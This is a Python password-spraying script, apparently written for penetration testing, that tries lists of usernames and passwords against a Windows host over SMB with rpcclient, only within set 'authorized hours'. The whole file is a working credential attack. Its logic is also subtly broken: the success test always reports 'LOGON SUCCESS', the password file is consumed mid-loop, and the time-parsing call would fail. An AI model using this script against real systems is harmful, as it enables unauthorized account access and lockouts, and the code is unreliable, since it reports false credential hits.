#!/usr/bin/python3

import subprocess
import time

# Set the start and stop times in 24-hour format
START_TIME = input()
STOP_TIME = input()
USERS = input()
PASSWORDS = input()
SLEEP = input()
HOST = input()

RPCCLIENT = subprocess.check_output(["which", "rpcclient"]).decode("utf-8").strip()
NMBLOOKUP = subprocess.check_output(["which", "nmblookup"]).decode("utf-8").strip()

output = subprocess.check_output([NMBLOOKUP, "-A", HOST])
DOMAIN = output.decode("utf-8").split("\n")[0].split(" ")[-1]

# Set the current time
CURRENT_TIME = time.strftime("%H%M")

# Loop until the current time is between argument #1 and #2
while int(CURRENT_TIME) < int(START_TIME) or int(CURRENT_TIME) >= int(STOP_TIME):
    # If the current time is outside of the start and stop times, sleep for 5 minutes
    time.sleep(300)
    # Update the current time
    CURRENT_TIME = time.strftime("%H%M")

# The script will reach this point when the current time is between the authorized hours

# Spray loop
ITR = 0
with open(PASSWORDS, "r") as f:
    for PASS in f:
        ITR += 1
        print(f"Current Password: {PASS.strip()}")
        with open(USERS, "r") as g:
            for USER in g:
                subprocess.call([RPCCLIENT, "-m=SMB3", f"-U", f"{DOMAIN}\\{USER.strip()}%{PASS.strip()}", HOST, "-c", "getusername; quit"], stderr=subprocess.DEVNULL)
                if subprocess.call(["echo", "$?"]) == 0:
                    print(f"{DOMAIN}\\{USER.strip()}:{PASS.strip()} - LOGON SUCCESS at {time.strftime('%c')}")
        if ITR < len(f.readlines()):
            print(f"Sleeping {SLEEP} seconds.")
            time.sleep(int(SLEEP))
        # Check the current time
        if int(CURRENT_TIME) < int(START_TIME) or int(CURRENT_TIME) >= int(STOP_TIME):
            TARGET_DATE = time.mktime(time.strptime(f"tomorrow {START_TIME}", "%c"))
            print("Pausing - outside authorized hours. Will resume spraying again once the system time is back within the authorized hours.")
            # Update the current time       
            CURRENT_TIME = time.strftime("%H%M")
            # Loop until the current time is the target time
            while time.time() < TARGET_DATE:
                # Sleep for 1 minute
                time.sleep(60)
                # Update the current time
                CURRENT_TIME = time.strftime("%H%M")
            #
